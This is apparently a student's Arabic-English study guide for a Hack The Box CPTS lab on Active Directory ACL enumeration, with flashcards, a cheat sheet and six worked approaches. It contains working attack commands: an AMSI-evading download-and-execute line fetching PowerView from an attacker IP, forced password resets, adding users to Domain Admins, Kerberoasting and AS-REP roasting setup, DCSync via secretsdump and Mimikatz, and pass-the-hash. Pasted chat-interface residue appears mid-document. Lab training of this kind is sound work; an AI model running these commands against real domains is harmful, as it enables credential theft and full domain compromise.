━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #5

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: متى نضطر لاستخدام أوامر PowerShell الأصلية (مثل Get-Acl) بدل PowerView؟

✅ Back: في البيئات المراقبة بشدة حيث تقوم أنظمة الـ EDR/AV بحظر أو اكتشاف أدوات الاختراق الخارجية مثل PowerView.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #6

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هي الصلاحية (`ObjectAceType`) التي تتيح لك تنفيذ هجوم DCSync وسحب كلمات سر الدومين؟

✅ Back: صلاحية `DS-Replication-Get-Changes` و `DS-Replication-Get-Changes-In-Filtered-Set`.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #7

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: في BloodHound، ماذا تعني قائمة `Transitive Object Control`؟

✅ Back: تعرض الكائنات التي يمكنك السيطرة عليها بشكل "غير مباشر" عبر سلسلة من القفزات المتعددة (مثل وراثة الجروبات أو السيطرة على مدراء).

━━━━━

📄 ورقة غش السكشن — للسكرين شوت

🛑 ورقة غش: تعداد واستكشاف الصلاحيات (ACL Enumeration)

🎯 هدف هذا السكشن بجملة:

تحديد الكائنات التي تملك عليها سيطرة (مباشرة أو متعدية) انطلاقاً من حسابك المخترق باستخدام PowerView لبناء مسار هجوم، وتصوير ذلك عبر BloodHound.

⚔️ خوارزمية التطبيق للتعداد اليدوي (PowerView):

١. احصل على הـ SID الخاص بحسابك المخترق (`Convert-NameToSid`).

٢. ابحث عن الأوبجكتات التي يمتلك فيها هذا الـ SID صلاحيات باستخدام (`Get-DomainObjectACL`).

٣. استخدم الفلتر `Where-Object` (علامة `?`) لعزل الصلاحيات الخاصة بك فقط.

٤. تأكد من تفعيل `-ResolveGUIDs` لقراءة الصلاحية باللغة الإنجليزية.

٥. إذا كانت الصلاحية على Group، تفقد الـ Nested Groups (`Get-DomainGroup`).

📐 جدول الأوامر الأساسية لهذا السكشن:

|**الهدف**|**الأمر**|**ملاحظة**|
|---|---|---|
|استخراج SID ליوزر|`$sid = Convert-NameToSid wley`|خطوة التجهيز الأولى.|
|بحث موجه ومترجم|`Get-DomainObjectACL -ResolveGUIDs -Identity * \| ? {$_.SecurityIdentifier -eq $sid}`|سحب الصلاحيات الخاصة باليوزر المختار فقط وترجمتها.|
|التحقق من تداخل المجموعات|`Get-DomainGroup -Identity "Help Desk Level 1" \| select memberof`|لمعرفة الجروبات الأعلى التي سترث صلاحياتها.|
|بحث عن طريق سطر اوامر اصلي|`get-acl "AD:\$(Get-ADUser username)"`|بديل لـ PowerView إذا كان محظوراً (Native LOLBAS).|

🔢 مفاتيح وحقول مهمة يجب مراقبتها بالـ Output:

- `ObjectDN`: من هو الضحية الذي نملك صلاحية عليه؟
    
- `SecurityIdentifier`: من هو الفاعل (أنت)؟
    
- `ObjectAceType`: ما هي الصلاحية التي نملكها (مثلاً GenericAll)؟
    

🚨 الفخوخ الخاصة بهذا السكشن:

❌ [فخ ١]: نسيان استخدام `-ResolveGUIDs` والغرق في محاولة فهم أرقام GUID مبهمة.

❌ [فخ ٢]: تشغيل `Find-InterestingDomainAcl` في شبكة فعلية ضخمة مما يؤدي لتجميد الجهاز أو كشف نشاطك.

❌ [فخ ٣]: العثور على `GenericWrite` لجروب وإضافة نفسك، ثم الفشل بالاستغلال بسبب عدم تحديث الـ Session (Log off / Log on) للحصول على الـ Token الجديد.

💡 Golden Tip:

دائماً ابدأ بـ BloodHound لرؤية الصورة الكبيرة (Big Picture) والمسارات القصيرة (Shortest Paths)، واستخدم PowerView للتحقق الفوري (Verification) من عقدة محددة قبل تنفيذ الهجوم للتأكد من عدم تغيير الإعدادات مؤخراً.

━━━━━

🎯 رسالة الختام:

بهيج خلصنا. هسة عندك:

✅ ليش هذا الموضوع موجود (Big Picture)

✅ كل المصطلحات الجديدة بالسكشن

✅ كيف السكشن مبني وشنو يبي يعلمك

✅ الشرح العميق لكل مفهوم بأمثلة وتشبيهات

✅ ما لم يقله HTB (الـ gotchas والثغرات بالشرح)

✅ فلاشكاردز السكشن

✅ ورقة غش مخصصة للـ lab

الآن ارجع اقرأ نص السكشن الأصلي بـ HTB — وراح تلاحظ إن كل جملة صارت واضحة وإن فاهم ليش موجودة. بالتوفيق! 💪]

```text
══════════════════════════════════════════════════════════════════
[✓] PHASE_I EXTRACTION COMPLETE
[✓] THEORETICAL FRAMEWORK LOADED INTO MEMORY
[→] TRANSITIONING TO LIVE CHALLENGE ENVIRONMENT . . .
══════════════════════════════════════════════════════════════════
```

## 🎯 PHASE_II — حقل التدريب :: السؤال وطرق الحل الستة

> [!success] ☣️ PHASE II INITIALIZED · LIVE CHALLENGE ENVIRONMENT
> **Language:** English — **Size:** ~2,000 Words
> **Content:** Official HTB question · Lab target setup · 6 attack methods against live infrastructure.

[
---

## 1\. THE QUESTION & SYSTEMATIC THOUGHT PROCESS

### 🔍 Re-stating the Problem in Simple Terms

These five questions are all about **ACL Enumeration** — the process of discovering which users have special permissions over other users, groups, or objects inside an **Active Directory (AD)** environment.

Think of Active Directory like a **company's organizational chart + security system combined**. Every object (user, group, computer, etc.) has a list called an **ACL (Access Control List)** that says: _"User A is allowed to do X to me."_ These rules are called **ACEs (Access Control Entries)**.

As a penetration tester, you want to find misconfigurations like:

-   User A can **force-change the password** of User B (without knowing the old one!)
-   User B can **add members** to a security group
-   That group eventually leads to **Domain Admin** access

This is called an **ACL Attack Chain** — each link takes you closer to full control.

### 🧠 The Hacker's Mental Model

```
wley ──(ForceChangePassword)──► damundsen ──(GenericWrite on group)──►
Help Desk Level 1 ──(nested in)──► Information Technology ──(GenericAll)──►
adunn ──(DCSync rights)──► DOMAIN CONTROLLER = GAME OVER
```

Every arrow above is an ACE discovered through enumeration. You are mapping a **privilege escalation path**.

### 🎯 Why We Use These Specific Tools

Tool

Why It's Used

**PowerView**

Purpose-built for AD enumeration; can resolve GUIDs to readable names

**Built-in PS cmdlets** (`Get-Acl`, `Get-ADUser`)

Available on client machines where PowerView may be blocked

**BloodHound**

Visualizes entire attack paths automatically

---

## 2\. SIX DISTINCT SOLUTION APPROACHES

### 📌 Setup (Do this first on the RDP target)

powershell

```
# Step 1: RDP into the target (from your attacker machine or Pwnbox)
xfreerdp /v:<TARGET_IP> /u:htb-student /p:Academy_student_AD!

# Step 2: Open PowerShell as the htb-student user
# Step 3: Import PowerView (it's on the Desktop)
Import-Module C:\Tools\PowerView.ps1
```

---

### ✅ Approach 1 — Direct GUID Lookup via Microsoft Documentation (Q1)

**What this solves:** Finding the GUID for `User-Force-Change-Password` without any tools.

**Command:**

powershell

```
# Reverse-lookup a GUID to a human-readable right name
$guid = "00299570-246d-11d0-a768-00aa006e0529"

Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" `
  -Filter {ObjectClass -like 'ControlAccessRight'} `
  -Properties * | Select-Object Name, DisplayName, DistinguishedName, rightsGuid `
  | Where-Object {$_.rightsGuid -eq $guid} | Format-List
```

**Expected Output:**

```
Name              : User-Force-Change-Password
DisplayName       : Reset Password
DistinguishedName : CN=User-Force-Change-Password,CN=Extended-Rights,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
rightsGuid        : 00299570-246d-11d0-a768-00aa006e0529
```

**✅ Answer to Q1:** `00299570-246d-11d0-a768-00aa006e0529`

> **Failure Scenarios:**
> 
> -   The `ActiveDirectory` module is not installed → Run `Install-WindowsFeature RSAT-AD-PowerShell` or use PowerView instead
> -   The account lacks rights to query the Configuration partition → Try a different account

> **Pivot Trigger:** If `Get-ADObject` returns nothing or throws a `cmdlet not found` error, move to Approach 2.

---

### ✅ Approach 2 — PowerView with `-ResolveGUIDs` (Q2, Q3)

**What this solves:** Enumerating what rights user `wley` has, and then what `damundsen` has — but now with **human-readable** output instead of raw GUIDs.

**Command:**

powershell

```
# Get the SID of wley first
$sid = Convert-NameToSid wley

# Now search for all objects where wley has rights — with readable names
Get-DomainObjectACL -ResolveGUIDs -Identity * | Where-Object {$_.SecurityIdentifier -eq $sid}
```

**Expected Output:**

```
AceQualifier           : AccessAllowed
ObjectDN               : CN=Dana Amundsen,OU=DevOps,...,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password   ← Human readable!
...
```

**Without** `-ResolveGUIDs`, it would show `00299570-246d-11d0-a768-00aa006e0529` — totally unreadable.

**✅ Answer to Q2:** `-ResolveGUIDs`

Now for Q3 — enumerate what `damundsen` can do:

powershell

```
$sid2 = Convert-NameToSid damundsen
Get-DomainObjectACL -ResolveGUIDs -Identity * | Where-Object {$_.SecurityIdentifier -eq $sid2}
```

**Expected Output:**

```
AceType               : AccessAllowed
ObjectDN              : CN=Help Desk Level 1,OU=Security Groups,...,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite   ← KEY FIELD
...
```

**✅ Answer to Q3:** `GenericWrite`

> **Failure Scenarios:**
> 
> -   `Identity *` makes this slow (1-2 minutes minimum). In large environments it may time out.
> -   PowerView may be flagged by Windows Defender/AMSI (blocked before it runs)

> **Pivot Trigger:** If the command runs for more than 5 minutes with no output, or if you get an AMSI/AV warning, move to Approach 3.

---

### ✅ Approach 3 — Targeted Enumeration for `forend` over `dpayne` (Q4)

**What this solves:** Finding the specific rights `forend` has over `dpayne`.

powershell

```
# Step 1: Get forend's SID
$sid3 = Convert-NameToSid forend

# Step 2: Enumerate ACLs — target the specific user dpayne for speed
Get-DomainObjectACL -ResolveGUIDs -Identity "dpayne" | Where-Object {$_.SecurityIdentifier -eq $sid3}
```

> **Why target `dpayne` specifically?** Instead of scanning ALL objects (`-Identity *`), we query only the object we care about. This is **much faster**.

**Expected Output:**

```
AceQualifier           : AccessAllowed
ObjectDN               : CN=Dagmar Payne,OU=...,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : GenericAll        ← THIS IS THE ANSWER
ObjectAceType          : All
SecurityIdentifier     : S-1-5-21-...-XXXX  (forend's SID)
...
```

**✅ Answer to Q4:** `GenericAll`

> **What does `GenericAll` mean?**  
> It means forend has **FULL CONTROL** over dpayne. This includes:
> 
> -   Resetting their password
> -   Adding them to groups
> -   Performing targeted Kerberoasting
> -   Modifying any attribute

> **Failure Scenarios:**
> 
> -   `dpayne` is the display name but the samAccountName might differ. Use `Get-ADUser -Filter {DisplayName -like "*Dagmar*"}` to verify.

> **Pivot Trigger:** If the query returns empty, check the SamAccountName: `Get-ADUser -Filter * | Select-Object Name, SamAccountName | Where-Object {$_.Name -like "*Payne*"}`

---

### ✅ Approach 4 — Enumerating `forend` over `GPO Management` Group (Q5)

**What this solves:** Finding the ObjectAceType of forend's first right over the GPO Management group.

powershell

```
# Re-use forend's SID from Approach 3
$sid3 = Convert-NameToSid forend

# Target the specific group for speed
Get-DomainObjectACL -ResolveGUIDs -Identity "GPO Management" | Where-Object {$_.SecurityIdentifier -eq $sid3}
```

**Expected Output:**

```
AceType               : AccessAllowed
ObjectDN              : CN=GPO Management,OU=Security Groups,...,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : Self
ObjectAceType         : Self-Membership     ← THIS IS THE ANSWER
...
```

**✅ Answer to Q5:** `Self-Membership`

> **What does `Self-Membership` mean?**  
> The user `forend` can **add themselves** to the GPO Management group. They don't need someone else to do it for them — they can self-enroll.

> **Failure Scenarios:**
> 
> -   The group name might need exact capitalization: `"GPO Management"` not `"gpo management"`
> -   Multiple ACEs may be returned — the question asks for the **first** one

> **Pivot Trigger:** If no results, try: `Get-DomainGroup -Identity "GPO*"` to verify the exact group name.

---

### ✅ Approach 5 — Using Built-in PowerShell (No PowerView Required)

**What this solves:** Finding ACL rights without any third-party tool (fallback method).

powershell

```
# Step 1: Export all user SamAccountNames
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > C:\Users\htb-student\Desktop\ad_users.txt

# Step 2: Loop through each user and check ACLs for forend
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {
    Get-Acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access `
    | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\forend'}
}
```

**Expected Output (partial):**

```
Path                  : Microsoft.ActiveDirectory.Management.dll\ActiveDirectory:://RootDSE/CN=Dagmar Payne,...
ActiveDirectoryRights : GenericAll
InheritanceType       : All
ObjectType            : 00000000-0000-0000-0000-000000000000
...
IdentityReference     : INLANEFREIGHT\forend
```

> **Note:** You'll get the GUID `00000000-0000-0000-0000-000000000000` for `GenericAll` since it applies to all object types. You'll need to then run the reverse GUID lookup from Approach 1 to decode it.

> **Failure Scenarios:**
> 
> -   This loop is **very slow** in large environments (can take 10+ minutes)
> -   The `ActiveDirectory` module must be installed (`RSAT` tools)

> **Pivot Trigger:** If the loop hangs or the AD module is unavailable, use PowerView (Approach 2/3/4).

---

### ✅ Approach 6 — BloodHound Visual Path Analysis

**What this solves:** Visually confirming all attack paths simultaneously — the professional's shortcut.

**Steps:**

bash

```
# Step 1: On the target (or via RDP), run SharpHound ingestor
.\SharpHound.exe -c All --zipfilename bloodhound_data.zip

# Step 2: Transfer the zip to your attacker machine
# Step 3: Start BloodHound
sudo neo4j start
bloodhound &

# Step 4: Upload the ZIP file via the "Upload Data" button
```

**BloodHound Queries to answer the questions:**

```
# In BloodHound search box:
1. Search for "wley" → Node Info → Outbound Control Rights → First Degree Object Control
2. Search for "forend" → Node Info → Outbound Control Rights
3. Use pre-built query: "Find Principals with DCSync Rights"
```

**Expected Visual Output:**

-   Nodes (circles) connected by labeled arrows
-   `wley` → `ForceChangePassword` → `damundsen`
-   `forend` → `GenericAll` → `dpayne`

> **Failure Scenarios:**
> 
> -   AV/EDR may flag SharpHound as malicious
> -   Neo4j database may not start if Java is missing
> -   Large environments create very large ZIP files

> **Pivot Trigger:** If SharpHound is blocked, use PowerView approaches above. BloodHound is the ideal tool but not always available.

---

## 3\. THE "WHAT IF" MASTERCLASS — 6 CPTS Scenarios

---

**🔴 Scenario 1: What if PowerView is blocked by Windows Defender/AMSI?**

**The Problem:** When you run `Import-Module .\PowerView.ps1`, Windows Defender catches and blocks it. You see:

```
Import-Module : File PowerView.ps1 cannot be loaded because running scripts is disabled...
```

or an AMSI trigger error.

**The Solution:**

powershell

```
# Option A: AMSI Bypass (load into memory, bypasses string-based detection)
IEX (New-Object Net.WebClient).DownloadString('http://<YOUR_IP>/PowerView.ps1')

# Option B: Use the built-in AD module (no bypass needed)
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName

# Option C: Use encoded commands to bypass script-based detection
$bytes = [System.IO.File]::ReadAllBytes("C:\Tools\PowerView.ps1")
$encoded = [Convert]::ToBase64String($bytes)
powershell -EncodedCommand $encoded

# Option D: Use PowerView's obfuscated/renamed version
# Rename functions like Get-DomainObjectACL to Get-ADObjectACL
```

**Key Lesson:** Never rely on a single tool. Always have the native `Get-Acl` + `Get-ADObject` workflow as your backup.

---

**🔴 Scenario 2: What if the user you control has no interesting ACL rights?**

**The Problem:** You run `Get-DomainObjectACL -ResolveGUIDs -Identity * | Where-Object {$_.SecurityIdentifier -eq $sid}` and get **zero results** or only meaningless rights.

**The Solution — Enumerate the full user's group memberships first:**

powershell

```
# Check what groups your user belongs to
Get-ADUser -Identity wley -Properties MemberOf | Select-Object -ExpandProperty MemberOf

# Check if any of those groups have interesting ACLs
$groupSID = Convert-NameToSid "YourGroup"
Get-DomainObjectACL -ResolveGUIDs -Identity * | Where-Object {$_.SecurityIdentifier -eq $groupSID}

# Also check for nested group memberships
Get-DomainGroup -Identity "YourGroup" | Select-Object memberof
```

**Key Lesson:** ACL rights can come from **group membership**, not just direct user assignment. Always enumerate both.

---

**🟡 Scenario 3: What if you find GenericWrite on a Group — what exactly can you do?**

**The Problem:** You find `damundsen` has `GenericWrite` over `Help Desk Level 1`. You know this is useful but aren't sure what to do next.

**The Solution — GenericWrite on a group allows you to add members:**

powershell

```
# Step 1: Change damundsen's password (since wley has ForceChangePassword)
$newpass = ConvertTo-SecureString 'NewPass@123!' -AsPlainText -Force
Set-DomainUserPassword -Identity damundsen -AccountPassword $newpass

# Step 2: Authenticate as damundsen (open new PS window or use runas)
$cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $newpass)

# Step 3: Use GenericWrite to add yourself to the group
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $cred

# Step 4: Verify membership
Get-DomainGroupMember -Identity 'Help Desk Level 1'
```

**Key Lesson:** `GenericWrite` on a **group** = you can add members. `GenericWrite` on a **user** = you can modify attributes (like setting an SPN for Kerberoasting).

---

**🟡 Scenario 4: What if you find GenericAll on a User — what are ALL the attacks possible?**

**The Problem:** `forend` has `GenericAll` over `dpayne`. You want to know every possible attack vector.

**The Solution — GenericAll = Full Control. Here are all your options:**

powershell

```
# OPTION 1: Force change their password
Set-DomainUserPassword -Identity dpayne -AccountPassword (ConvertTo-SecureString 'Hacked@123!' -AsPlainText -Force)

# OPTION 2: Targeted Kerberoasting (set a fake SPN, request ticket, crack offline)
Set-DomainObject -Identity dpayne -SET @{serviceprincipalname='fake/NOTHING'}
# Then use Rubeus or GetUserSPNs.py to request the TGS ticket

# OPTION 3: Shadow Credentials attack (if ADCS is present)
# Add a Key Credential Link to dpayne's msDS-KeyCredentialLink attribute

# OPTION 4: Add them to a privileged group
Add-DomainGroupMember -Identity 'Domain Admins' -Members dpayne

# OPTION 5: Set their account to not require Kerberos pre-auth (ASREPRoasting)
Set-DomainObject -Identity dpayne -XOR @{useraccountcontrol=4194304}
```

**Key Lesson:** `GenericAll` is the most dangerous right. It's essentially full ownership of that object. **Always check for it.**

---

**🟡 Scenario 5: What if the ObjectAceType returns a GUID instead of a name even with -ResolveGUIDs?**

**The Problem:** Despite using `-ResolveGUIDs`, you still see a raw GUID like `ab721a53-1e2f-11d0-9819-00aa0040529b` in the output.

**The Solution — Do a manual reverse GUID lookup:**

powershell

```
# Manual reverse GUID lookup
$mystery_guid = "ab721a53-1e2f-11d0-9819-00aa0040529b"

# Method 1: Query Extended-Rights in the Configuration partition
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" `
  -Filter {ObjectClass -like 'ControlAccessRight'} `
  -Properties * | Where-Object {$_.rightsGuid -eq $mystery_guid} | Select-Object Name, DisplayName

# Method 2: Query the Schema partition for attribute-based GUIDs
Get-ADObject -SearchBase "CN=Schema,$((Get-ADRootDSE).ConfigurationNamingContext)" `
  -Filter {ObjectClass -like 'attributeSchema'} `
  -Properties * | Where-Object {$_.schemaIDGUID -eq [guid]$mystery_guid} | Select-Object Name

# Method 3: Google it — Microsoft's AD Schema documentation
# https://docs.microsoft.com/en-us/windows/win32/adschema/
```

**Key Lesson:** There are two places GUIDs live: `Extended-Rights` (for access rights like ForceChangePassword) and `Schema` (for attribute-level access). Know both.

---

**🔴 Scenario 6: What if the attack chain leads to DCSync rights — what does that mean and how do you exploit it?**

**The Problem:** You've followed the full chain and now have control over `adunn`, who has `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-In-Filtered-Set` rights. What now?

**The Solution — DCSync Attack:**

These two rights together allow a user to **pretend to be a Domain Controller** and request password hashes for ANY account, including **krbtgt** and **Administrator**.

bash

```
# From your Linux attacker machine (or Pwnbox)
# Using secretsdump.py (Impacket)
python3 secretsdump.py -outputfile inlanefreight_hashes \
  -just-dc INLANEFREIGHT/adunn@<DC_IP>

# OR target a specific user's hash
python3 secretsdump.py -just-dc-user Administrator \
  INLANEFREIGHT/adunn@<DC_IP>

# Expected output:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796EE39FD3A9C3A1573966A64CC31CC:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd9d3a7c49b1...
```

powershell

```
# From Windows (using Mimikatz)
.\mimikatz.exe
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:Administrator
```

**What to do with the hashes:**

bash

```
# Pass-the-Hash to get a shell as Administrator
evil-winrm -i <DC_IP> -u Administrator -H 7796EE39FD3A9C3A1573966A64CC31CC

# Or crack the hash offline with Hashcat
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

**Key Lesson:** DCSync = Game Over for the domain. The full attack chain we enumerated leads here. This is why ACL misconfigurations are **critical findings** in any penetration test report.

---

## 📊 Full Attack Chain Summary

```
wley (compromised via LLMNR poisoning)
  │
  │ [ForceChangePassword — GUID: 00299570-246d-11d0-a768-00aa006e0529]
  ▼
damundsen
  │
  │ [GenericWrite over group]
  ▼
Help Desk Level 1 ──(nested in)──► Information Technology
                                         │
                                         │ [GenericAll]
                                         ▼
                                       adunn
                                         │
                                         │ [DS-Replication-Get-Changes + DS-Replication-Get-Changes-In-Filtered-Set]
                                         ▼
                                   DCSync Attack → ALL HASHES → Domain Compromise
```

---

## 🎓 Key Concepts to Remember for CPTS

Term

Simple Definition

**ACL**

A list saying who can do what to an AD object

**ACE**

One single rule within an ACL

**GUID**

A unique ID for a specific right/property (like `00299570...` = ForceChangePassword)

**`-ResolveGUIDs`**

PowerView flag that translates GUIDs to readable names

**`GenericAll`**

Full control over an object — the most dangerous right

**`GenericWrite`**

Can modify most attributes, including group membership

**`ForceChangePassword`**

Can reset a user's password without knowing the old one

**`Self-Membership`**

A user can add themselves to a group

**`DCSync`**

Replication rights that let you pull password hashes from a DC

$0.147,707 tok175.5s

Responses are AI-generated and can be inaccurate. Review all outputs before relying on them.

Select a modelSelect a model]

```text
══════════════════════════════════════════════════════════════════
[✓] PHASE_II ATTACK SEQUENCES DOCUMENTED
[✓] 6 / 6 EXPLOITATION METHODS CAPTURED
[→] LOADING DEEP-DIVE ANALYSIS & GLOSSARY . . .
══════════════════════════════════════════════════════════════════
```

## 🔴 PHASE_III — دليل الاختراق :: التحليل والمصطلحات

> [!success] ⚠️ PHASE III INITIALIZED · EXPLOITATION GUIDE & GLOSSARY
> **Language:** Arabic + English Mixed — **Size:** ~2,000 Words
> **Content:** Arabic breakdown of all 6 methods · Flashcards · Cheat Sheet · Golden Tips.

[كلمة شرح الطرق الستة + مصطلحات + ورقة الغش]

```text
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║  [✓] SESSION COMPLETE — ZERO KNOWLEDGE GAPS DETECTED                 ║
║  [✓] 3 PHASES · ~6,000 WORDS · 6 ATTACK METHODS DOCUMENTED           ║
║  [✓] AUTHORED BY: Hexsein · T4E Channel · CPTS Candidate             ║
║  [→] NEXT TARGET: SEC-[NUM+1] — [REPLACE: NEXT SECTION NAME]         ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
```